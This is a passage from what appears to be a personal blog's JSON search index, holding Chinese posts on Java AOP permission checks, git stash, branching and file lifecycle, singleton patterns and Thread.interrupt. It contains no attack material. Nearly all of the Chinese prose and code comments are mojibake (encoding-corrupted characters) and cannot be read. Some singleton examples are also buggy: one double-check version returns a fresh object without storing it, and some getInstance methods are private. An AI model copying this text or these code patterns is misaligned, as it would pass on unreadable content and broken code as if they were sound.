session.getAttribute(&quot;admin&quot;);//ä¸Šé¢ä¸¤è¡Œä»£ç å¯ä»¥è·å–åˆ°request,å³å¯ä»¥è·å–session if(!Objects.isNull(admin)){ System.out.println(admin); MethodSignature ms = (MethodSignature) proceedingJoinPoint.getSignature(); Method method = ms.getMethod(); Permission permission = ((Method) method).getAnnotation(Permission.class); String[] permissions = permission.value();//æ­¤å¤„å¯ä»¥è·å–@Permissionä¸­çš„æ³¨è§£,å­—ç¬¦ä¸²æ•°ç»„ //å½“ç„¶è¦å¯¹è¿™ä¸ªpermissionsè¿™ä¸ªåˆ¤æ–­æ˜¯å¦é•¿åº¦ä¸º0,æœ¬ä»£ç ä¸­æœªåˆ¤æ–­æ˜¯ä¸ä¸¥è°¨çš„ if(!permissionService.hasPermission(admin.getId(),permissions)){ return LayData.builder().code(-1).msg(&quot;æ²¡æœ‰æƒé™&quot;).build(); } //æ­¤å¤„çš„LayDataæ˜¯responseçš„ç»Ÿä¸€æ ¼å¼ } Object result = proceedingJoinPoint.proceed(); return result; } }å‰ç«¯ajaxå¤„çš„å°è£…ä»£ç /** * ajaxå°è£… * url å‘é€è¯·æ±‚çš„åœ°å€ * data å‘é€åˆ°æœåŠ¡å™¨çš„æ•°æ®,æ•°ç»„å­˜å‚¨,å¦‚: {&quot;date&quot;:new Date().getTime(),&quot;state&quot;:1} * successfn æˆåŠŸå›è°ƒå‡½æ•° * errorfn å¤±è´¥å›è°ƒå‡½æ•° * */ jQuery.postAjax = function (url,data,successfn,errorfn) { data = (data === null || data === &quot;&quot; || typeof (data) === &quot;undefined&quot;) ?{&quot;date&quot;:new Date().getTime()}:data; var loadObj = layer.load(2); $.ajax({ type: &quot;post&quot;, data: data, url: url, success: function (d,textStatus,jqXHR) { layer.close(loadObj); if(d.code === -100){//ç™»å½•çŠ¶æ€å·²å¤±æ•ˆ layer.confirm(&quot;ç™»å½•å·²å¤±æ•ˆ,è¯·é‡æ–°ç™»å½•&quot;, {icon:2,title: &apos;æç¤º&apos;,btn: [&apos;ç¡®å®š&apos;], closeBtn:0},function (index) { window.location.href = &quot;/login.html&quot;; }) return; } if(d.code === -1) {//æ— æƒæ“ä½œæˆ–æƒé™è¢«ç¦ console.log(&quot;æ²¡æœ‰æƒé™&quot;); layer.msg(d.msg,{icon:0}); return; } successfn(d); }, error:function (e) { layer.close(loadObj); if(errorfn !== undefined){ errorfn(e); } } }) }åç«¯è°ƒç”¨ä»£ç @Permission(&quot;/admin/disable&quot;) @RequestMapping(&quot;/disable&quot;) @ResponseBody public Object administratorDisable(Integer userId){ Integer returnCode = adminService.setStatus(Admin.builder().id(userId.longValue()).status(false).build()); if(returnCode == 0){ return LayData.builder().code(400).build(); }else{ return LayData.builder().code(200).build(); } } æˆ‘ä¼šæ›´åŠ èµåŒä¸€äº›è§‚ç‚¹,å·æ‡’ä¹Ÿæ˜¯äººç±»è¿›æ­¥çš„é˜¶æ¢¯. åœ¨æˆ‘å‘ç°è¦åšé‡å¤çš„äº‹æƒ…çš„æ—¶å€™,ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„äº‹æƒ…,åº”è¯¥æ˜¯ååˆ†æœ‰æ–¹æ³•ç®€åŒ–å®ƒ æ­¤å¤„,è¦æ„Ÿè°¢gunså¼€æºæ¡†æ¶,ç»™æˆ‘çš„çµæ„Ÿ,ä½¿ç”¨æ³¨è§£å®ç°aop aopä¸­è·å–request æ³¨è§£é…åˆaopä½¿ç”¨,æ¥è‡ªgunsæºç ","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"aop","slug":"aop","permalink":"http://yoursite.com/tags/aop/"},{"name":"annotation","slug":"annotation","permalink":"http://yoursite.com/tags/annotation/"}]},{"title":"git stash","slug":"git stash","date":"2019-05-08T09:15:34.000Z","updated":"2020-11-14T17:11:01.322Z","comments":true,"path":"2019/05/08/git stash/","link":"","permalink":"http://yoursite.com/2019/05/08/git%20stash/","excerpt":"","text":"Git å·¥å…· - å‚¨è—ï¼ˆStashingï¼‰ ç»å¸¸æœ‰è¿™æ ·çš„äº‹æƒ…å‘ç”Ÿï¼Œå½“ä½ æ­£åœ¨è¿›è¡Œé¡¹ç›®ä¸­æŸä¸€éƒ¨åˆ†çš„å·¥ä½œï¼Œé‡Œé¢çš„ä¸œè¥¿å¤„äºä¸€ä¸ªæ¯”è¾ƒæ‚ä¹±çš„çŠ¶æ€ï¼Œè€Œä½ æƒ³è½¬åˆ°å…¶ä»–åˆ†æ”¯ä¸Šè¿›è¡Œä¸€äº›å·¥ä½œã€‚é—®é¢˜æ˜¯ï¼Œä½ ä¸æƒ³æäº¤è¿›è¡Œäº†ä¸€åŠçš„å·¥ä½œï¼Œå¦åˆ™ä»¥åä½ æ— æ³•å›åˆ°è¿™ä¸ªå·¥ä½œç‚¹ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„åŠæ³•å°±æ˜¯git stash å‘½ä»¤ã€‚ â€œâ€˜å‚¨è—â€â€œå¯ä»¥è·å–ä½ å·¥ä½œç›®å½•çš„ä¸­é—´çŠ¶æ€â€”â€”ä¹Ÿå°±æ˜¯ä½ ä¿®æ”¹è¿‡çš„è¢«è¿½è¸ªçš„æ–‡ä»¶å’Œæš‚å­˜çš„å˜æ›´â€”â€”å¹¶å°†å®ƒä¿å­˜åˆ°ä¸€ä¸ªæœªå®Œç»“å˜æ›´çš„å †æ ˆä¸­ï¼Œéšæ—¶å¯ä»¥é‡æ–°åº”ç”¨ã€‚ git stash ç°åœ¨ä½ æƒ³åˆ‡æ¢åˆ†æ”¯ï¼Œä½†æ˜¯ä½ è¿˜ä¸æƒ³æäº¤ä½ æ­£åœ¨è¿›è¡Œä¸­çš„å·¥ä½œï¼›æ‰€ä»¥ä½ å‚¨è—è¿™äº›å˜æ›´ã€‚ä¸ºäº†å¾€å †æ ˆæ¨é€ä¸€ä¸ªæ–°çš„å‚¨è—ï¼Œåªè¦è¿è¡Œ git stash huskyui@ubuntu:~/Desktop/git/lesson09$ echo &quot;ddd&quot;&gt;d.txt huskyui@ubuntu:~/Desktop/git/lesson09$ git add . huskyui@ubuntu:~/Desktop/git/lesson09$ git stash Saved working directory and index state WIP on dev: 1785850 second commit huskyui@ubuntu:~/Desktop/git/lesson09$ git status On branch dev nothing to commit, working tree clean huskyui@ubuntu:~/Desktop/git/lesson09$ git checkout master Switched to branch &apos;master&apos; huskyui@ubuntu:~/Desktop/git/lesson09$ git status On branch master nothing to commit, working tree cleangit stash list è¿™æ—¶ï¼Œä½ å¯ä»¥æ–¹ä¾¿åœ°åˆ‡æ¢åˆ°å…¶ä»–åˆ†æ”¯å·¥ä½œï¼›ä½ çš„å˜æ›´éƒ½ä¿å­˜åœ¨æ ˆä¸Šã€‚è¦æŸ¥çœ‹ç°æœ‰çš„å‚¨è—ï¼Œä½ å¯ä»¥ä½¿ç”¨ git stash list ï¼š huskyui@ubuntu:~/Desktop/git/lesson09$ git stash list stash@{0}: WIP on dev: 1785850 second commit stash@{1}: WIP on master: 0b94950 inital commit stash@{2}: WIP on master: 0b94950 inital commit stash@{3}: WIP on dev: 0b94950 inital commitgit stash apply å¯¹æ–‡ä»¶çš„å˜æ›´è¢«é‡æ–°åº”ç”¨ï¼Œä½†æ˜¯è¢«æš‚å­˜çš„æ–‡ä»¶æ²¡æœ‰é‡æ–°è¢«æš‚å­˜ã€‚æƒ³é‚£æ ·çš„è¯ï¼Œä½ å¿…é¡»åœ¨è¿è¡Œ git stash apply å‘½ä»¤æ—¶å¸¦ä¸Šä¸€ä¸ª --index çš„é€‰é¡¹æ¥å‘Šè¯‰å‘½ä»¤é‡æ–°åº”ç”¨è¢«æš‚å­˜çš„å˜æ›´ã€‚å¦‚æœä½ æ˜¯è¿™ä¹ˆåšçš„ï¼Œä½ åº”è¯¥å·²ç»å›åˆ°ä½ åŸæ¥çš„ä½ç½® huskyui@ubuntu:~/Desktop/git/lesson09$ git stash apply 0 On branch master Changes to be committed: (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage) new file: d.txtgit stash drop apply é€‰é¡¹åªå°è¯•åº”ç”¨å‚¨è—çš„å·¥ä½œâ€”â€”å‚¨è—çš„å†…å®¹ä»ç„¶åœ¨æ ˆä¸Šã€‚è¦ç§»é™¤å®ƒï¼Œä½ å¯ä»¥è¿è¡Œ git stash drop ï¼ŒåŠ ä¸Šä½ å¸Œæœ›ç§»é™¤çš„å‚¨è—çš„åå­—ï¼š huskyui@ubuntu:~/Desktop/git/lesson09$ git stash drop 0 Dropped refs/stash@{0} (b1b6018668f2acbe33f11218f3c2759de07f8e86)git stash is a stack,åˆ é™¤æ—¶,æ¯æ¬¡éƒ½æ˜¯æœ€è¿‘çš„ä¸€ä¸ª","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"git branch","slug":"git branch","date":"2019-05-08T09:07:50.000Z","updated":"2020-11-14T17:11:01.903Z","comments":true,"path":"2019/05/08/git branch/","link":"","permalink":"http://yoursite.com/2019/05/08/git%20branch/","excerpt":"","text":"git basic branchgit branch &lt;branchName&gt;#create branch git branch --list#show branch list, git checkout &lt;branchName&gt;#choose branch,HEAD is pointer of the current branch last commitcreate a file in branch 0.0.1,then checkout master ,merge 0.0.1git checkout 0.0.1 echo &quot;b&quot;&gt;b.txt git add b.txt git commit -m &quot;add b.txt&quot; git checkout master git merge 0.0.1git aliashuskyui@ubuntu:~/Desktop/git/lesson07$ git log --graph --decorate --oneline * 89f9c31 (HEAD -&gt; master, 0.0.1) add b * 4ed2d10 3 * 96d5837 2 * 26abdbb 1 * c85c670 inital commituse alias huskyui@ubuntu:~/Desktop/git/lesson07$ git config --local alias.tree &apos;log --graph --decorate --oneline&apos; huskyui@ubuntu:~/Desktop/git/lesson07$ git tree * 89f9c31 (HEAD -&gt; master, 0.0.1) add b * 4ed2d10 3 * 96d5837 2 * 26abdbb 1 * c85c670 inital commitcheckout -bgit checkout -b iss53 #Switched to a new branch &quot;iss53&quot; # git branch iss53 # git checkout iss53merge conflicthuskyui@ubuntu:~/Desktop/git/lesson08$ echo &quot;hellowoold&quot;&gt;c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git add . huskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m&quot;master commit c.txt&quot; [master 430916b] master commit c.txt 1 file changed, 1 insertion(+) create mode 100644 c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git checkout dev Switched to branch &apos;dev&apos; huskyui@ubuntu:~/Desktop/git/lesson08$ ls a.txt b.txt huskyui@ubuntu:~/Desktop/git/lesson08$ echo &quot;helloworld&quot;&gt;c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git add . huskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m&quot;dev commit c.txt&quot; [dev 01a61b3] dev commit c.txt 1 file changed, 1 insertion(+) create mode 100644 c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git checkout master Switched to branch &apos;master&apos; huskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev Auto-merging c.txt CONFLICT (add/add): Merge conflict in c.txt Automatic merge failed; fix conflicts and then commit the result. huskyui@ubuntu:~/Desktop/git/lesson08$ git status On branch master You have unmerged paths. (fix conflicts and run &quot;git commit&quot;) (use &quot;git merge --abort&quot; to abort the merge) Unmerged paths: (use &quot;git add &lt;file&gt;...&quot; to mark resolution) both added: c.txt no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;) huskyui@ubuntu:~/Desktop/git/lesson08$ vi c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git add c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m &quot;fixed conflict&quot; [master 2e602f6] fixed conflict huskyui@ubuntu:~/Desktop/git/lesson08$ git diff master..dev huskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev Already up to date. huskyui@ubuntu:~/Desktop/git/lesson08$ git branch --list dev * master huskyui@ubuntu:~/Desktop/git/lesson08$ git checkout dev Switched to branch &apos;dev&apos; huskyui@ubuntu:~/Desktop/git/lesson08$ git merge master Updating 01a61b3..2e602f6 Fast-forwardabort mergehuskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev Auto-merging c.txt CONFLICT (content): Merge conflict in c.txt Automatic merge failed; fix conflicts and then commit the result. huskyui@ubuntu:~/Desktop/git/lesson08$ git merge --abort huskyui@ubuntu:~/Desktop/git/lesson08$ git status On branch master nothing to commit, working tree clean huskyui@ubuntu:~/Desktop/git/lesson08$ git diff master..dev diff --git a/c.txt b/c.txt index 74b0666..1d8e2de 100644 --- a/c.txt +++ b/c.txt @@ -1 +1 @@ -helloworlxajsdjsads d +hsdfelloworld huskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev Auto-merging c.txt CONFLICT (content): Merge conflict in c.txt Automatic merge failed; fix conflicts and then commit the result. huskyui@ubuntu:~/Desktop/git/lesson08$ ls a.txt b.txt c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev error: Merging is not possible because you have unmerged files. hint: Fix them up in the work tree, and then use &apos;git add/rm &lt;file&gt;&apos; hint: as appropriate to mark resolution and make a commit. fatal: Exiting because of an unresolved conflict.delete branchgit branch -d dev#delete branch dev","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"singleton","slug":"singleton","date":"2019-05-04T07:06:33.000Z","updated":"2020-11-14T17:11:02.469Z","comments":true,"path":"2019/05/04/singleton/","link":"","permalink":"http://yoursite.com/2019/05/04/singleton/","excerpt":"","text":"å•ä¾‹ Singletonç±»è¢«ç§°ä¸ºå•ä¾‹ç±»,é€šè¿‡ä½¿ç”¨privateçš„æ„é€ å‡½æ•°ç¡®ä¿äº†åœ¨ä¸€ä¸ªåº”ç”¨åªäº§ç”Ÿä¸€ä¸ªå®ä¾‹. -â€”è®¾è®¡æ¨¡å¼ä¹‹ç¦… ä½¿ç”¨åœºæ™¯ åœ¨ä¸€ä¸ªç³»ç»Ÿä¸­,è¦æ±‚ä¸€ä¸ªç±»æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå¯¹è±¡,å¦‚æœå‡ºç°å¤šä¸ªå¯¹è±¡å°±ä¼šå‡ºç°â€ä¸è‰¯ååº”â€,å¯ä»¥é‡‡ç”¨å•ä¾‹æ¨¡å¼, å…·ä½“ä½¿ç”¨åœºæ™¯å¦‚ä¸‹: éœ€è¦ç”Ÿæˆå”¯ä¸€åºåˆ—å·çš„ç¯å¢ƒ åˆ›å»ºä¸€ä¸ªå¯¹è±¡éœ€è¦æ¶ˆè€—çš„èµ„æºè¿‡å¤š,å¦‚è¦è®¿é—®IOå’Œæ•°æ®åº“ç­‰èµ„æº. ç­‰ç­‰ å•ä¾‹çš„é€æ¸è¿›åŒ–ä¹‹è·¯1.é¥¿æ±‰å¼ /** * can&apos;t lazy load * é¥¿æ±‰å¼,ä¸èƒ½æ‡’åŠ è½½ * @author husky * @date 2019/5/3 20:42 */ public class SingletonObject1 { private static final SingletonObject1 instance = new SingletonObject1(); private SingletonObject1(){ //empty } private static SingletonObject1 getInstance(){ return instance; } }2.æ‡’æ±‰å¼ /** * åœ¨å¤šçº¿ç¨‹æƒ…å†µä¸‹æ˜¯ä¸å®‰å…¨çš„,å› ä¸ºåœ¨getIntsanceä¸­åˆ¤æ–­çš„æ—¶å€™,å¯èƒ½ä¼šé€ æˆå¤šä¸ªå®ä¾‹å‡ºç° * å®ç°æ‡’åŠ è½½,ä½†çº¿ç¨‹ä¸å®‰å…¨ * @author husky * @date 2019/5/3 21:02 */ public class SingletonObject2 { private static SingletonObject2 instance; private SingletonObject2(){ //empty } public static SingletonObject2 getInstance(){ if(null == instance){ instance = new SingletonObject2(); } return instance; } }3.çº¿ç¨‹å®‰å…¨æ‡’æ±‰å¼ /** * åŠ ä¸€æŠŠé”å¯ä»¥è§£å†³,è¿™æŠŠé”æ˜¯classé”,SingletonObject3.class * ä½†æ˜¯ä¼šé€ æˆæ•ˆç‡ä½ä¸‹ * å®ç°äº†çº¿ç¨‹å®‰å…¨,ä½†æ€§èƒ½ä¸é«˜ * @author husky * @date 2019/5/3 21:08 */ public class SingletonObject3 { private static SingletonObject3 instance; private SingletonObject3(){ //empty } public synchronized static SingletonObject3 getInstance(){ if(null == instance){ instance = new SingletonObject3(); } return instance; } }4.double-check /** * double check * è§£å†³äº†æ‡’åŠ è½½ä»¥åŠå•ä¾‹,ä»¥åŠæ€§èƒ½é—®é¢˜,ä½†æ˜¯æœ‰é—®é¢˜,å¯èƒ½ä¼šå‡ºç°ç©ºæŒ‡é’ˆå¼‚å¸¸ * åœ¨private SingletonObject()ä¼šé€ æˆfieldaæˆ–è€…fieldBæœªè¢«èµ‹å€¼,å¯¼è‡´ç©ºæŒ‡é’ˆ * @author husky * @date 2019/5/3 21:31 */ public class SingletonObject4 { private static SingletonObject4 instance; private int fieldA; private int fieldB; private SingletonObject4(){ fieldA = Integer.MIN_VALUE; fieldB = Integer.MAX_VALUE; } public static SingletonObject4 getInstance(){ if(null == instance){ synchronized (SingletonObject4.class){ if(null == instance){ instance = new SingletonObject4(); } } } return instance; } }æ­¤å¤„å‡ºç°çš„ç©ºæŒ‡é’ˆå¼‚å¸¸,å…·ä½“åŸå› å¯ä»¥æŸ¥çœ‹ double-checkå‡ºç°çš„é”™è¯¯ 5.double-check volatile /** * * åŠ å…¥volatileå¯ä»¥é¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸,ä¹Ÿå°±æ˜¯dcl,ä½†æ˜¯æ•ˆç‡æœ‰ç‚¹ä½ * @author husky * @date 2019/5/3 23:12 */ public class SingletonObject5 { private static volatile SingletonObject5 instance; private SingletonObject5(){ } private static SingletonObject5 getInstance(){ if(null == instance){ synchronized (SingletonObject5.class){ if(null == instance){ return new SingletonObject5(); } } } return instance; } }6.é™æ€å†…éƒ¨ç±» public class SingletonObject6 { private SingletonObject6(){ } private static class InstanceHolder { private final static SingletonObject6 instance = new SingletonObject6(); } public static SingletonObject6 getInstance(){ return InstanceHolder.instance; } }7.æšä¸¾,æ¨èä½¿ç”¨6æˆ–7,å…³äºæšä¸¾,ä¼šåœ¨åé¢åšå®¢å½“ä¸­è¿›è¡Œåˆ†æ import java.util.stream.IntStream; /** * æšä¸¾ç±»å‹ * @author husky * @date 2019/5/4 14:37 */ public class SingletonObject7 { private SingletonObject7(){ } private enum Singleton { /** * instance * */ INSTANCE; private final SingletonObject7 instance; Singleton(){ instance = new SingletonObject7(); } public SingletonObject7 getInstance(){ return instance; } } public static SingletonObject7 getInstance(){ return Singleton.INSTANCE.getInstance(); } public static void main(String[] args) { IntStream.rangeClosed(1,50).forEach(i-&gt;{ new Thread(String.valueOf(i)){ @Override public void run() { System.out.println(SingletonObject7.getInstance()); } }.start(); }); } }","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"è®¾è®¡æ¨¡å¼ä¹‹ç¦…","slug":"è®¾è®¡æ¨¡å¼ä¹‹ç¦…","permalink":"http://yoursite.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85/"},{"name":"å•ä¾‹","slug":"å•ä¾‹","permalink":"http://yoursite.com/tags/%E5%8D%95%E4%BE%8B/"}]},{"title":"git åˆ é™¤","slug":"git åˆ é™¤","date":"2019-05-03T15:28:04.000Z","updated":"2020-11-14T17:11:02.987Z","comments":true,"path":"2019/05/03/git åˆ é™¤/","link":"","permalink":"http://yoursite.com/2019/05/03/git%20%E5%88%A0%E9%99%A4/","excerpt":"","text":"delete fileæœ‰ä¸‰ç§æƒ…å†µ add beforerm rf fileNameadd after and commit beforegit rm --cached &lt;file&gt; #remove from cache,file will be untracked git rm -f &lt;file&gt; #delete file forcedsecond add and commit beforegit reset HEAD &lt;file&gt; #remove from cache,file will be untrackedcommit afterrm -rf c.txt #delete file git add c.txt #git rm c.txt git commit -m &quot;delete file&quot; #or discard changes in the git checkout -- c.txtgit commit time metaphorThe HEAD pointer is the reference to the last commit we did or the parent ofthe next commit we will do.So ,the HEAD pointer is the roadsign that indicates the way to move one step back to the past. git reset --hard HEAD # go back the last commit, #åœ¨æˆ‘ä»¬commitåä¿®æ”¹äº†æ–‡ä»¶,å¯ä»¥å›é€€åˆ°ä¸Šä¸€æ¬¡ç‰ˆæœ¬","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"gitæ–‡ä»¶ç”Ÿå‘½å‘¨æœŸä»¥åŠå¦‚ä½•ç®¡ç†æ–‡ä»¶","slug":"gitæ–‡ä»¶ç”Ÿå‘½å‘¨æœŸä»¥åŠå¦‚ä½•ç®¡ç†æ–‡ä»¶","date":"2019-05-02T14:20:57.000Z","updated":"2020-11-14T17:11:04.262Z","comments":true,"path":"2019/05/02/gitæ–‡ä»¶ç”Ÿå‘½å‘¨æœŸä»¥åŠå¦‚ä½•ç®¡ç†æ–‡ä»¶/","link":"","permalink":"http://yoursite.com/2019/05/02/git%E6%96%87%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6/","excerpt":"","text":"git configurationgit config --local # (currentGitDir)/.git/config git config --global # ~/.gitconfig git config --system # /etc/gitconfigä¼˜å…ˆçº§ ä»ä¸Šåˆ°ä¸‹,é€æ¸é€’å‡ file status lifecycle![git files status lifecycle](http://qjrzrivoh.hd-bkt.clouddn.com/1605373863.47939184840.png) At this point, you should have a bona fide Git repository on your localmachine, and a checkout or working copy of all of its files in front of you.Typically, youâ€™ll want to start making changes and committing snapshots ofthose changes into your repository each time the project reaches a state youwant to record. Remember that each file in your working directory can be in one of two states:tracked or untracked . Tracked files are files that were in the lastsnapshot; they can be unmodified, modified, or staged. In short, tracked filesare files that Git knows about. Untracked files are everything else â€” any files in your working directory thatwere not in your last snapshot and are not in your staging area. When youfirst clone a repository, all of your files will be tracked and unmodifiedbecause Git just checked them out and you havenâ€™t edited anything. As you edit files, Git sees them as modified, because youâ€™ve changed themsince your last commit. As you work, you selectively stage these modifiedfiles and then commit all those staged changes, and the cycle repeats. æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åªæœ‰ä¸¤ä¸­æ–‡ä»¶å½¢å¼,ä¸€ç§æ˜¯è¿½è¸ªæ–‡ä»¶å½¢å¼ä¸€ç§æ˜¯æœªè¿½è¸ªæ–‡ä»¶å½¢å¼.git commit#or use git commit -am &quot;commit message&quot; #but need add previous git add . git commit -m &quot;commit message&quot; git cat-filegit cat-file -p hash #git cat-file -p HEAD #tree 732576b05340242b4231f13b5d2d1f2b79b48b4f #parent ae8b33a221058055149b3357825493f8a1fc3fb3 #author huskyui &lt;2207019991@qq.com&gt; 1556800087 -0700 #committer huskyui &lt;2207019991@qq.com&gt; 1556800087 -0700 # #third commitæ¢ç©¶gitçš„æ–‡ä»¶å­˜å‚¨é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨git hash-object --stdinæŠŠæˆ‘è¦ä¿å­˜çš„æ•°æ®æ‰“å°å‡ºå¯¹åº”å“ˆå¸ŒåŠ å¯†(sha1)çš„ hashå€¼ ç„¶åå°†è¿™ä¸ªæ•°æ®è¾“å…¥è¿›c.txtè¿™ä¸ªæ–‡ä»¶,å¹¶å°†ä»–æäº¤ æ‰§è¡Œgit cat-file -p HEADå¯ä»¥æŸ¥æ‰¾åˆ°æ ‘, æˆ‘ä»¬è¿™æ¬¡ä½¿ç”¨git cat-file -p è¿™ä¸ªæ ‘çš„hash,å¯ä»¥æŸ¥çœ‹æ–‡æœ¬, æˆ‘ä»¬æ¸…æ¥šçœ‹åˆ°ç¬¬ä¸‰ä¸ªc.txtçš„hashå’Œæˆ‘ä»¬åˆšå¼€å§‹æ‰“å°å‡ºæ¥çš„ä¸œè¥¿ä¸€æ · ä¸‹é¢æŸ¥çœ‹ä»–å­˜å‚¨åœ¨å“ªå§ åœ¨æ¯ä¸ªä»“åº“çš„æœ‰ä¸ªéšå¼æ–‡ä»¶.git æˆ‘ä»¬æŸ¥çœ‹ ./git/object é‡Œé¢æœ‰å¾ˆå¤šæ–‡ä»¶,æˆ‘ä»¬æ‰“å¼€,hashå€¼çš„å‰ä¸¤ä¸ªå­—æ¯çš„æ–‡ä»¶å¤¹,é‡Œé¢çš„æ–‡ä»¶å¯¹åº”hashä¸¤ä½åçš„å­—ç¬¦ä¸² åœ¨è¿™é‡Œ,æˆ‘åšäº†ä¸ªæœ‰è¶£çš„è¯•éªŒ,å°†æ–‡ä»¶æäº¤å,åˆä¿®æ”¹äº†ä¸€ä¸‹, æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°.git/objecté‡Œé¢æ–°çš„æ–‡ä»¶, æ—§çš„æ–‡ä»¶å¯ä»¥æ‰¾åˆ°,æ–°çš„æ–‡ä»¶ä¹Ÿå¯ä»¥æ‰¾åˆ°,ä¹Ÿè®¸è¿™æ ·å¯ä»¥å®ç°å›é€€å§. huskyui@ubuntu:~$ echo &quot;aaa&quot;|git hash-object --stdin 72943a16fb2c8f38f9dde202b7a70ccc19c52f34 huskyui@ubuntu:~/Desktop/git/lesson03$ cat c.txt aaa huskyui@ubuntu:~/Desktop/git/lesson03$ git cat-file -p HEAD tree 27bec35d12fd2435823df93eb1f39622f46051d2 parent 1ac6576b5e450f5e23238fbf87bc1d9cdf916366 author huskyui &lt;2207019991@qq.com&gt; 1556801948 -0700 committer huskyui &lt;2207019991@qq.com&gt; 1556801948 -0700 fourth commit huskyui@ubuntu:~/Desktop/git/lesson03$ git cat-file -p 27bec35d12fd2435823df93eb1f39622f46051d2 100644 blob 340fef996d5ad07e8c2b9e3f413798abec2bc43d a.txt 100644 blob f6ab3cf9d6e218cdcc1ca089327389503b152bf8 b.txt 100644 blob 72943a16fb2c8f38f9dde202b7a70ccc19c52f34 c.txt c.txt hash huskyui@ubuntu:~/Desktop/git/lesson03$ cd .git huskyui@ubuntu:~/Desktop/git/lesson03/.git$ cd objects/ huskyui@ubuntu:~/Desktop/git/lesson03/.git/objects$ cd 72 huskyui@ubuntu:~/Desktop/git/lesson03/.git/objects/72$ ls 943a16fb2c8f38f9dde202b7a70ccc19c52f34","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"interrupt","slug":"interrupt","date":"2019-04-29T14:43:21.000Z","updated":"2020-11-14T17:11:04.758Z","comments":true,"path":"2019/04/29/interrupt/","link":"","permalink":"http://yoursite.com/2019/04/29/interrupt/","excerpt":"","text":"interrupté¦–å…ˆæ¢³ç†Threadå…³äºinterruptçš„å®šä¹‰/** * Interrupts this thread. * * &lt;p&gt; Unless the current thread is interrupting itself, which is * always permitted, the {@link #checkAccess() checkAccess} method * of this thread is invoked, which may cause a {@link * SecurityException} to be thrown. * * &lt;p&gt; If this thread is blocked in an invocation of the {@link * Object#wait() wait()}, {@link Object#wait(long) wait(long)}, or {@link * Object#wait(long, int) wait(long, int)} methods of the {@link Object} * class, or of the {@link #join()}, {@link #join(long)}, {@link * #join(long, int)}, {@link #sleep(long)}, or {@link #sleep(long, int)}, * methods of this class, then its interrupt status will be cleared and it * will receive an {@link InterruptedException}. * * &lt;p&gt; If this thread is blocked in an I/O operation upon an {@link * java.nio.channels.InterruptibleChannel InterruptibleChannel} * then the channel will be closed, the thread&apos;s interrupt * status will be set, and the thread will receive a {@link * java.nio.channels.ClosedByInterruptException}. * * &lt;p&gt; If this thread is blocked in a {@link java.nio.channels.Selector} * then the thread&apos;s interrupt status will be set and it will return * immediately from the selection operation, possibly with a non-zero * value, just as if the selector&apos;s {@link * java.nio.channels.Selector#wakeup wakeup} method were invoked. * * &lt;p&gt; If none of the previous conditions hold then this thread&apos;s interrupt * status will be set. &lt;/p&gt; * * &lt;p&gt; Interrupting a thread that is not alive need not have any effect. * * @throws SecurityException * if the current thread cannot modify this thread * * @revised 6.0 * @spec JSR-51 */ public void interrupt() è¿™é‡Œè®²è¿°äº†Threadå®ä¾‹å¯¹è±¡è°ƒç”¨æ–¹æ³•interrupt,æœ‰è¿™å‡ ç§æƒ…å†µâ€‹ 1.åœ¨çº¿ç¨‹é‡Œé¢æœ‰wait,sleep,joinæ–¹æ³•,ä¼šå¼¹å‡ºInterruptedException,çŠ¶æ€ä¼šè¢«æ¸…é™¤ â€‹ 2.ioé‡Œé¢,ä¼šå¼¹å‡ºå¼‚å¸¸,çŠ¶æ€ä¼šè¢«è®¾ç½®,â€¦ â€‹ 3.å¦‚æœçº¿ç¨‹é˜»å¡åœ¨nioä¸­çš„Selectorä¸­,çŠ¶æ€ä¼šè¢«è®¾ç½®,â€¦ â€‹ 4.å¦‚æœä¸æ˜¯ä¸Šé¢,è¿™äº›æƒ…å†µ,çŠ¶æ€ä¼šè¢«è®¾ç½® å¯ä»¥çœ‹å‡ºinterruptæ˜¯å…³äºçŠ¶æ€çš„è®¾ç½®æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹ç¬¬ä¸€ç§,æ²¡æœ‰ä»»ä½•æƒ…å†µçš„public static void main(String[] args) { Thread t1 = new Thread(()-&gt;{ while(true){ if (interrupted()) { break; } System.out.println(&quot;i&quot; + new Date()); } }); t1.start(); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } t1.interrupt(); 